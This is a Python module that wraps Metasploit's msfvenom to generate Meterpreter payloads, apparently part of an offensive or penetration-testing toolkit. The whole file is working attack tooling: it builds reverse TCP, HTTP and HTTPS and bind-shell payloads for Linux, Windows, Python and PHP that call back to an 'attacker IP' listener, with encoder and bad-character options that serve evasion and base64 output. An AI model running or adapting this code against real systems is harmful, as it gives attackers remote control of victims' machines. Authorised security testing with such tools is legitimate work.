"""Meterpreter payload generation with msfvenom integration.

This module provides integration with Metasploit Framework's msfvenom
for generating Meterpreter payloads. Gracefully degrades if msfvenom
is not available.
"""

import base64
import platform
import shutil
import subprocess
from enum import Enum
from typing import Optional


class MeterpreterPayloadType(Enum):
    """Supported Meterpreter payload types."""
    REVERSE_TCP = "reverse_tcp"
    REVERSE_HTTPS = "reverse_https"
    BIND_TCP = "bind_tcp"
    REVERSE_HTTP = "reverse_http"


class MeterpreterPlatform(Enum):
    """Target platforms for Meterpreter payloads."""
    LINUX_X64 = "linux/x64"
    LINUX_X86 = "linux/x86"
    WINDOWS_X64 = "windows/x64"
    WINDOWS_X86 = "windows"
    PYTHON = "python"
    PHP = "php"


class MeterpreterFormat(Enum):
    """Output formats for Meterpreter payloads."""
    ELF = "elf"
    EXE = "exe"
    RAW = "raw"
    PYTHON = "python"
    BASH = "bash"
    POWERSHELL = "psh"


class MsfvenomNotFoundError(Exception):
    """Raised when msfvenom is not found in PATH."""
    pass


class MeterpreterGenerator:
    """Generates Meterpreter payloads using msfvenom."""

    def __init__(self):
        """Initialize MeterpreterGenerator and check for msfvenom."""
        self.msfvenom_path = self._find_msfvenom()
        self.available = self.msfvenom_path is not None

    def _find_msfvenom(self) -> Optional[str]:
        """Find msfvenom in PATH or common locations.

        Returns:
            Path to msfvenom executable or None if not found
        """
        msfvenom = shutil.which('msfvenom')
        if msfvenom:
            return msfvenom

        if platform.system() == "Windows":
            wsl_path = shutil.which('wsl')
            if wsl_path:
                try:
                    result = subprocess.run(
                        ['wsl', 'which', 'msfvenom'],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if result.returncode == 0 and result.stdout.strip():
                        return 'wsl msfvenom'
                except (subprocess.TimeoutExpired, Exception):
                    pass

        common_paths = [
            '/usr/bin/msfvenom',
            '/usr/local/bin/msfvenom',
            '/opt/metasploit-framework/bin/msfvenom'
        ]

        for path in common_paths:
            if shutil.which(path):
                return path

        return None

    def is_available(self) -> bool:
        """Check if msfvenom is available.

        Returns:
            True if msfvenom is available, False otherwise
        """
        return self.available

    def generate(
        self,
        payload_type: MeterpreterPayloadType,
        platform_type: MeterpreterPlatform,
        lhost: str,
        lport: int,
        format_type: MeterpreterFormat = MeterpreterFormat.RAW,
        encoder: Optional[str] = None,
        iterations: int = 1,
        bad_chars: Optional[str] = None,
        output_file: Optional[str] = None
    ) -> Optional[bytes]:
        """Generate Meterpreter payload using msfvenom.

        Args:
            payload_type: Type of Meterpreter payload
            platform_type: Target platform
            lhost: Listener host (attacker IP)
            lport: Listener port
            format_type: Output format
            encoder: Optional encoder (e.g., 'x64/xor', 'x86/shikata_ga_nai')
            iterations: Number of encoding iterations
            bad_chars: Bad characters to avoid (e.g., '\\x00\\x0a\\x0d')
            output_file: Optional file to write payload to

        Returns:
            Payload bytes if successful, None if msfvenom unavailable

        Raises:
            MsfvenomNotFoundError: If msfvenom is not available
            subprocess.CalledProcessError: If msfvenom execution fails
        """
        if not self.available:
            raise MsfvenomNotFoundError(
                "msfvenom not found. Install Metasploit Framework or ensure it's in PATH."
            )

        payload_name = f"{platform_type.value}/meterpreter/{payload_type.value}"

        cmd = [
            self.msfvenom_path if not self.msfvenom_path.startswith('wsl') else 'wsl',
        ]

        if self.msfvenom_path.startswith('wsl'):
            cmd.append('msfvenom')

        cmd.extend([
            '-p', payload_name,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', format_type.value
        ])

        if encoder:
            cmd.extend(['-e', encoder, '-i', str(iterations)])

        if bad_chars:
            cmd.extend(['-b', bad_chars])

        if output_file:
            cmd.extend(['-o', output_file])

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=60
            )

            if result.returncode != 0:
                result.stderr.decode() if result.stderr else "Unknown error"
                raise subprocess.CalledProcessError(
                    result.returncode,
                    cmd,
                    output=result.stdout,
                    stderr=result.stderr
                )

            return result.stdout if not output_file else None

        except subprocess.TimeoutExpired:
            raise TimeoutError("msfvenom execution timed out after 60 seconds")

    def generate_reverse_tcp(
        self,
        lhost: str,
        lport: int,
        platform_type: MeterpreterPlatform = MeterpreterPlatform.LINUX_X64,
        format_type: MeterpreterFormat = MeterpreterFormat.ELF,
        encoder: Optional[str] = None
    ) -> Optional[bytes]:
        """Generate reverse TCP Meterpreter payload.

        Args:
            lhost: Listener host
            lport: Listener port
            platform_type: Target platform
            format_type: Output format
            encoder: Optional encoder

        Returns:
            Payload bytes or None
        """
        return self.generate(
            MeterpreterPayloadType.REVERSE_TCP,
            platform_type,
            lhost,
            lport,
            format_type,
            encoder
        )

    def generate_reverse_https(
        self,
        lhost: str,
        lport: int,
        platform_type: MeterpreterPlatform = MeterpreterPlatform.LINUX_X64,
        format_type: MeterpreterFormat = MeterpreterFormat.ELF
    ) -> Optional[bytes]:
        """Generate reverse HTTPS Meterpreter payload.

        Args:
            lhost: Listener host
            lport: Listener port
            platform_type: Target platform
            format_type: Output format

        Returns:
            Payload bytes or None
        """
        return self.generate(
            MeterpreterPayloadType.REVERSE_HTTPS,
            platform_type,
            lhost,
            lport,
            format_type
        )

    def generate_python_payload(
        self,
        lhost: str,
        lport: int,
        encode_base64: bool = False
    ) -> Optional[str]:
        """Generate Python Meterpreter payload.

        Args:
            lhost: Listener host
            lport: Listener port
            encode_base64: Whether to base64 encode the payload

        Returns:
            Python payload string or None
        """
        payload = self.generate(
            MeterpreterPayloadType.REVERSE_TCP,
            MeterpreterPlatform.PYTHON,
            lhost,
            lport,
            MeterpreterFormat.RAW
        )

        if payload:
            payload_str = payload.decode('utf-8', errors='ignore')
            if encode_base64:
                payload_str = base64.b64encode(payload_str.encode()).decode()
            return payload_str

        return None

    def list_payloads(self, search_term: Optional[str] = None) -> list[str]:
        """List available Meterpreter payloads.

        Args:
            search_term: Optional search term to filter payloads

        Returns:
            List of available payload names
        """
        if not self.available:
            return []

        cmd = [self.msfvenom_path if not self.msfvenom_path.startswith('wsl') else 'wsl']

        if self.msfvenom_path.startswith('wsl'):
            cmd.append('msfvenom')

        cmd.extend(['--list', 'payloads'])

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                payloads = []
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if 'meterpreter' in line.lower():
                        if search_term is None or search_term.lower() in line.lower():
                            payload_name = line.split()[0] if line.split() else None
                            if payload_name:
                                payloads.append(payload_name)
                return payloads
        except (subprocess.TimeoutExpired, Exception):
            pass

        return []


def create_meterpreter_generator() -> MeterpreterGenerator:
    """Factory function to create MeterpreterGenerator.

    Returns:
        MeterpreterGenerator instance
    """
    return MeterpreterGenerator()


def check_msfvenom_available() -> bool:
    """Quick check if msfvenom is available.

    Returns:
        True if msfvenom is available, False otherwise
    """
    gen = MeterpreterGenerator()
    return gen.is_available()
